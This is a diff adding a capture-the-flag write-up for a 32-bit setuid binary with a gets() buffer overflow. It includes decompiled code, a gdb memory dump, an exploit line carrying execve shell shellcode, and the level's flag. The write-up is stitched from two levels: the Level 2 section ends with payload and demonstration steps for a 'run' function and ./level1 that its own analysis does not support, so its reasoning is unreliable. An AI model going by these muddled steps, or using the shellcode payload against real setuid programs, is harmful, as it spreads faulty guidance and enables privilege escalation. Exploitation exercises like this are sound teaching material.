@@ -8,3 +8,112 @@ return main address: 0xb7e454d3
 
 (python -c 'print "A"*76 + "\x68\xfc\xff\xbf\x4a\x85\x04\x08\x50\x85\x04\x08" + "A"*8 + "\xa0\xfc\xff\xbf" + "\x90"*100 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"';cat) | ./level2
 
+
+# Level 2
+
+## General Informations 
+
+**Path** : `/home/user/level2/level2` </br>
+**File** : 
+```
+level2: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x0b5bb6cdcf572505f066c42f7be2fde7c53dc8bc, not stripped
+```
+**Permissions**: `-rwsr-s---+ 1 level3 users 5403 Mar  6  2016 level2`
+
+## Static analysis
+
+After decompiling the binary with ghidra we get the pseudo code below: 
+
+```
+void p(void)
+
+{
+  uint unaff_retaddr;
+  char local_50 [76];
+  
+  fflush(stdout);
+  gets(local_50);
+  if ((unaff_retaddr & 0xb0000000) == 0xb0000000) {
+    printf("(%p)\n",unaff_retaddr);
+                    // WARNING: Subroutine does not return
+    _exit(1);
+  }
+  puts(local_50);
+  strdup(local_50);
+  return;
+}
+
+void main(void)
+
+{
+  p();
+  return;
+}
+```
+
+We have 2 functions. </br>
+The `main` that executes the `p` function. </br>
+The `p` function, which save the user input inside a buffer and verify that the return address of the function isn't a **stack address** (`0xb0000000 - 0xbfffffff`). </br>
+If it is then we enter the exit condition else the buffer is stored in the heap by `strdup`. 
+</br> 
+
+## Vulnerability found 
+
+The `gets` function write the user input from stdin inside the buffer. `gets` doesn't verify the length of the user input (buffer overrun), which make it a vulnerable function. <br/>
+We can write more bytes in memory than the buffer can save, we can corrupt the memory.
+
+## Dynamic Analysis
+
+Firstly we write a shellcode inside the buffer
+```
+(gdb) r <<< $(python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + "A" * (75 - 28)')
+(gdb) x/32x $esp 
+0xbffff6b0:	0xbffff6cc	0x00000000	0x00000000	0xb7e5ec73
+0xbffff6c0:	0x080482b5	0x00000000	0x00000000	0x6850c031
+0xbffff6d0:	0x68732f2f	0x69622f68	0x89e3896e	0xb0c289c1
+0xbffff6e0:	0x3180cd0b	0x80cd40c0	0x41414141	0x41414141
+0xbffff6f0:	0x41414141	0x41414141	0x41414141	0x41414141
+0xbffff700:	0x41414141	0x41414141	0x41414141	0x0804854a
+0xbffff710:	0x41414141	0x00414141	0xbffff728	0x0804854a
+0xbffff720:	0x08048550	0x00000000	0x00000000	0xb7e454d3
+```
+
+We need to find a way to overwrite the address `0x0804854a` `($ebp + 4)` by the address of our buffer. 
+
+When looking to the rest of the instruction we see that our buffer is copied to the heap wich have a different address.
+
+
+
+## Payload construction 
+
+In the static analysis we found that the `run` function executes a shell.
+
+We can overwrite the `return address of main` by the address of the `run` function. 
+```
+info functions
+...
+0x08048444  run
+
+payload: (python -c 'print "A" * 76 + "\x44\x84\x04\x08"')
+```
+
+We redirect the stream to the program with a pipe and we add the command `cat` to keep the shell alive.
+```
+(python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
+```
+
+
+## Demonstration 
+
+```
+level1@RainFall:~$ (python -c 'print "A" * 76 + "\x44\x84\x04\x08"'; cat) | ./level1
+Good... Wait what?
+whoami
+level2
+```
+
+## Flag 
+
+```
+53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
+```
